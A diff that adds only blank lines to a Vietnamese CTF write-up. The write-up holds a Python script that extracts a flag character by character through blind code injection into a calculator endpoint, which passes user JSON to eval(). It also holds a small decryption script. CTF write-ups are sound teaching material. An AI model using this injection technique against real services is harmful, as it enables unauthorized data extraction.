@@ -29,18 +29,22 @@ Fuzz qua thì biết được hàm `ord()` và một số kí tự khác như `\
 ```python
 import requests
 import string
+
 url = 'https://calculator-w78ar.ondigitalocean.app/'
 characters = string.ascii_letters + string.digits + string.punctuation
 # val = f"{int(eval(request.json['f']))}"
+
 flag = ''
 for i in range(len(flag), 100):
     for c in characters:
         json = {
             "f": f"flag_enc[{i}:{i+1}] == '{c}'"
         }
+        
         r = requests.post(url+'calc', json=json)
         result = r.json()['result']
         print(flag+c)
+        
         if result == '1':
             flag += c
             print('[FOUND] : ' + flag)
@@ -56,6 +60,7 @@ Flag nhận được đã bị encrypt bằng hàm `encrypt()` trong file `secre
 **Python scripts**: Decrypt encrypted flag
 ```python
 FLAG = 'OGXWNZ{q0q_vlon3z0lw3cha_4wno4ffs_q0lem!}'
+
 def encrypt(text: str, key: int):
     result = ''
     for c in text:
@@ -73,6 +78,7 @@ def encrypt(text: str, key: int):
         else:
             result += c
     return result
+    
 def reverse(c, er):
     a = ord(c) - ord(er)
     if a >= 20:
@@ -80,6 +86,7 @@ def reverse(c, er):
     else:
         result = a + 26 - key + ord(er)
     return chr(result)
+    
 def decrypt(text: str, key: int):
     result = ''
     for c in text:
@@ -93,14 +100,18 @@ def decrypt(text: str, key: int):
         else:
             result += c
     return result
+    
 def find_key():
     for i in range(100):
         if encrypt('UMDCTF', i) == 'OGXWNZ':
             return i
+            
 key = find_key()
 print(f'[KEY FOUND] : ' + str(key))
+
 flag_dec = decrypt(FLAG, key)
 flag_enc = encrypt(flag_dec, key)
+
 print(flag_dec)
 print(flag_enc)
 ```
